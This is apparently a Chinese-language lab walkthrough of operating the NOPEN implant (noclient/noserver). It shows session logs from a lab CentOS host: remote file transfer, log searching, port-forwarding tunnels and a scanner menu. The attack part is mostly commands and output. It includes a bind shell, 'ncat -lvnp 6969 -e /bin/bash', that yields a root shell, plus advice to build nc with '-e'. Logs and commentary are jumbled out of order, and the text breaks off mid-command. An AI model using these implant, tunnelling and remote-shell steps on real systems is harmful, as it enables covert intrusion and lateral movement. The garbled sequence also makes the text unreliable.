Please connect to me on 2005
cat norc.linux
alias joe=-status
joe
[03-16-22 07:47:22 GMT][localhost:55475 -> centos4x86.local.172.19.2.11:32754]
[-status]
-find -xm 03-02-2022
[03-16-22 08:15:19 GMT][localhost:55475 -> centos4x86.local.172.19.2.11:32754]
[-find -xm 03-02-2022]
Command out file: /home/hacker/test/../down/cmdout/centos4x86.local.172.19.2.11-
find
Command out file: /home/hacker/test/../down/cmdout/centos4x86.local.172.19.2.11-
2022-03-16-07:47:13
sh: mkfinds: command not found
I'm afraid we could not start mkfinds
-cd /tmp
[03-16-22 08:17:10 GMT][localhost:55475 -> centos4x86.local.172.19.2.11:32754]
[-cd /tmp]
NO! centos4x86.local:/tmp>-ls
[03-16-22 08:17:11 GMT][localhost:55475 -> centos4x86.local.172.19.2.11:32754]
[-ls]
drwxrwxrwt    6 root     root         4096 Mar 13 04:32 2022 .
drwxr-xr-x   23 root     root         4096 Mar 11 01:10 2022 ..
drwxrwxrwt    2 root     root         4096 Mar 11 01:10 2022 .ICE-unix
drwxrwxrwt    2 root     root         4096 Mar 11 01:10 2022 .font-unix
drwx------    2 root     root         4096 Feb 26 14:02 2022 gconfd-root
除了find命令，其他都是些简单的目录操作。
远程文件操作
操作逻辑和ftp类似，只是通过专用程序进行。oget支持指定起始和结束进行文件传输。
get put cat
upload
upload则支持将文件定向到端口。配合netcat，可以实现文件传输。
drwxr-xr-x    3 root     root         4096 Mar 10 01:33 2022 screens
NO! centos4x86.local:/tmp>-cdp
[03-16-22 08:17:15 GMT][localhost:55475 -> centos4x86.local.172.19.2.11:32754]
[-cdp]
-get ourtn
[03-16-22 08:43:07 GMT][localhost:55475 -> centos4x86.local.172.19.2.11:32754]
[-get ourtn]
  ourtn -- 
/home/hacker/test/../down/centos4x86.local.172.19.2.11/root/bvp47/ourtn
/home/hacker/test/../down/centos4x86.local.172.19.2.11/root/bvp47/ourtn: No such 
file or directory
-put hello.txt remote_hello.txt
[03-16-22 08:46:28 GMT][localhost:55475 -> centos4x86.local.172.19.2.11:32754]
[-put hello.txt remote_hello.txt]
local sha1sum: 4bb4334d3350f950bab4b20f089c4c396ba5faf5  hello.txt
  hello.txt -- remote_hello.txt [0700]
          14/          14 100% (195%C)
-rwx------    1 root     root           14 Mar 13 12:10 2022 remote_hello.txt
-cat remote_hello.txt
[03-16-22 08:47:01 GMT][localhost:55475 -> centos4x86.local.172.19.2.11:32754]
[-cat remote_hello.txt]
Hello world!
-upload hello.txt 6969 172.19.2.13
[03-17-22 02:22:20 GMT][localhost:21655 -> centos4x86.local.172.19.2.11:32754]
[-upload hello.txt 6969 172.19.2.13]
noclient: waiting for remote connection...
noclient: received connection from 172.19.2.13  [03-17-22 02:26:57 GMT]
noclient: file upload complete, closing remote connection
noclient: remote connection closed
noclient: local connection closed  [03-17-22 02:26:57 GMT]
 ./ncat 172.19.2.11 6969 > hello.txt
[root@centos5x86 ncat]# cat hello.txt
Hello world!
grep mailgrep
grep进行文件内容搜索。
其中mailgrep是比较有特点的操作，通过对邮件进行扫描，可以对附件进行扫描分析。
cksum
但是cksum的算法不能确定，不是sha1也不是RIPEMD160。经过后续的研究，发现是sha1的修改版。
chili
chili木有找到使用方法。
远程网络穿透
在内网渗透过程中，利用各种的端口转发和流量代理，构建渗透通道，是非常必要的功能，这部分功能
强大，值得学习。
tunnel
-grep login /var/log/messages.1
[03-17-22 02:35:31 GMT][localhost:21655 -> centos4x86.local.172.19.2.11:32754]
[-grep login /var/log/messages.1]
Mar 10 01:21:38 centos4x86 login(pam_unix)[5216]: session opened for user root 
by LOGIN(uid=0)
Mar 11 01:09:05 centos4x86 login(pam_unix)[5216]: session closed for user root
-cksum noserver-server
[03-17-22 02:43:29 GMT][localhost:21655 -> centos4x86.local.172.19.2.11:32754]
[-cksum noserver-server]
Opening checksum file "/home/hacker/test/../etc/cksums"... ok
- 7B5A89C4D1B92348623CE0FDD94D7361A297B8AA Sat Mar 12 04:20:21 2022 noserver-
server
-chili 01-01-2000 src nortn
[03-17-22 03:07:02 GMT][localhost:21655 -> centos4x86.local.172.19.2.11:32754]
[-chili 01-01-2000 src nortn]
-tunnel
[03-18-22 02:00:58 GMT][localhost:52710 -> centos4x86.local.172.19.2.11:32754]
[-tunnel]
Starting NOPEN -tunnel...
NO! tunnel> -?
[-?]
*******NOPEN -tunnel commands*******
[h]elp     - show this help
[t]imeout time
  [r]emote listenport [target [port [rem_target]]]
  [l]ocal  listenport target [port [source_port]]
  [L]ocal  listenport target [port [source_port]]; with one byte extra for 
socket state
  [u]dp    listenport target [port [source_port]]
  [U]dp    listenport [target [port]]
在输入tunnel命令后，就进入到隧道管理子模块中。命令行的设计非常nice。
这个隧道模式支持tcp和udp两种方式，支持两端监听。下面，我们以最常见的将内网端口映射到外部进
行操作。
先在server端执行。
然后在noclient的控制台执行隧道操作。
这个操作就是将远端的6969端口映射到本地，只要连接本地的端口，会自动通过隧道连接到远端的对应
端口。
使用nc，直接操作远端机器了。
nc最好是自己编译的带-e参数的版本
从上面的例子可以看出，非常简单，也非常方便。
输入Ctrl+C退出隧道模式。
irtun istun jackpop
  [c]lose channel
  [s]tatus - prints status messages for channels
  [q]uit   - leaves the tunnel.
    Please do not hit Ctrl+C, it will cause the tunnels to break
 ./ncat/ncat -lvnp 6969 -e /bin/bash
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::6969
Ncat: Listening on 0.0.0.0:6969
Ncat: Connection from 172.19.2.11.
Ncat: Connection from 172.19.2.11:32796.
NO! tunnel> l 6969 172.19.2.11 6969
[l 6969 172.19.2.11 6969]
NOTICE: channel 1 listen success
./ncat localhost 6969
id&&hostname&&ip a show eth0
uid=0(root) gid=0(root) 
groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) 
context=root:system_r:unconfined_t
centos4x86.local
2: eth0:  mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 08:00:27:34:56:70 brd ff:ff:ff:ff:ff:ff
    inet 172.19.2.11/24 brd 172.19.2.255 scope global eth0
    inet6 fe80::a00:27ff:fe34:5670/64 scope link
       valid_lft forever preferred_lft forever
-irtun 172.19.2.1 6969
[03-18-22 06:07:31 GMT][localhost:52710 -> centos4x86.local.172.19.2.11:32754]
[-irtun 172.19.2.1 6969]
noclient: executing: ourtn -D 0.0.0.0 -W 127.0.0.1:20548 -i 0.0.0.0 -p 6969 
 172.19.2.1
Undefined subroutine &main::mygetinput called at /usr/bin/ourtn line 2242.
这个利用dewdrop,tipoff来构建隧道。这里还没有分析这两个程序，并且这个perl脚本，也有BUG，需
要进一步修改。
nrtun
noclient: tunneled process 25833 terminated with status 9
noclient: ourtn exited early
ourtn execution failed, exiting
-istun 172.19.2.1 6969
[03-18-22 06:14:17 GMT][localhost:52710 -> centos4x86.local.172.19.2.11:32754]
[-istun 172.19.2.1 6969]
noclient: executing: ourtn -D 0.0.0.0 -W 127.0.0.1:20548 -i 0.0.0.0 -p 6969 
 172.19.2.1
Undefined subroutine &main::mygetinput called at /usr/bin/ourtn line 2242.
noclient: tunneled process 28287 terminated with status 9
noclient: ourtn exited early
ourtn execution failed, exiting
-jackpop 172.19.2.11 6969 172.19.2.13 6969
[03-18-22 06:25:13 GMT][localhost:52710 -> centos4x86.local.172.19.2.11:32754]
[-jackpop 172.19.2.11 6969 172.19.2.13 6969]
-jackpop is only supported for Solaris 2.6+, you are using Linux 2.6.9-89.EL
-nrtun 172.19.2.11:2005
[03-18-22 06:26:27 GMT][localhost:52710 -> centos4x86.local.172.19.2.11:32754]
[-nrtun 172.19.2.11:2005]
Listening on centos4x86.local.172.19.2.11:2005 (172.19.2.11:2005)
Connecting to localhost:42609 (127.0.0.1:42609)
Allowing connections from anywhere
Executing: ./noclient-3.3.2.3-linux-i386 -l 42609
NOPEN!                             v3.3.2.3
Usage: scanner typeofscan IP_address
  Scan options:
        winl   Scan for windows boxes
        winn   Scan for windows names
        xwin   Scan for Xwin folks
        time   Scan for NTP  folks
         rpc   Scan for RPC  folks
       snmp1   Scan for SNMP version
       snmp2   Scan for Sol  version
        echo   Scan for echo hosts
       time2   Scan for daytime hosts
        tftp   Scan for tftp hosts
        tday   Scan for daytime hosts
       ident   Scan ident
        mail   Scan mail
         ftp   Scan ftp
     t_basic   Scan TCP port
        http   Scan web
     netbios   Does not work
         dns   Scan for DNS
       ripv1   Scan for RIP v1
由于参数不够，扫描器退出。noclient进入反向连接模式，等待noserver进行连接。
nstun
利用noserver进行堆叠，构建隧道。
rawsend
       ripv2   Scan for RIP v2
         lpr   Scan for lpr
    miniserv   Scan for Redflag Web
    win_scan   Get windows version
      telnet   Banner Telnet
      finger   Banner finger
         ssl   Scan for SSL stuff
         ssh   Scan for SSH version
       snmp3   Finnish Test Case SNMP
     dtuname   DT uname test
           #   port other than above
         all   (you are really cool)
        sane   (you are really smart, all - snmp1 and snmp2)
You are the weakest link, goodbye
ourtn version 5.4.0.3
scripme version 2.0.2.4
Fri Mar 18 06:38:16 GMT 2022
NHOME=/home/hacker/test/..
Reading resource file "/home/hacker/test/../etc/norc"... 
/home/hacker/test/../etc/norc: No such file or directory
TERM=screen
Entering server mode
noclient: waiting for remote connection...
Listening on *:26962... ok
Accepted connection from 127.0.0.1:60985
Initiating RSA key exchange
-nstun 172.19.2.1
[03-18-22 06:42:58 GMT][localhost:52710 -> centos4x86.local.172.19.2.11:32754]
[-nstun 172.19.2.1]
Listening on localhost:53676 (127.0.0.1:53676)
Connecting to 172.19.2.1:32754 (172.19.2.1:32754)
Waiting for NOPEN tunnels to be ready...
Executing: ./noclient-3.3.2.3-linux-i386 127.0.0.1:53676
Fri Mar 18 06:43:00 GMT 2022
NHOME=/home/hacker/test/..
Reading resource file "/home/hacker/test/../etc/norc"... 
/home/hacker/test/../etc/norc: No such file or directory
TERM=screen
Entering client mode
noclient: received local connection, contacting server
Attempting connection from 0.0.0.0:14796 to 127.0.0.1:53676... ok
Initiating RSA key exchange
在noclient开个端口，监听输入，并将输入转发到noserver上。
rtun
反向隧道与前面的正向隧道一样，只是连接方向反过来。
在noserver上启动nc。
然后在noclient上执行。
然后在noclient启动nc。
通过设置不同形式的nc工作方式，可以得到更多的组合。
rutun
采用UDP建立反向隧道。
在noserver上运行nc.
-rawsend 6969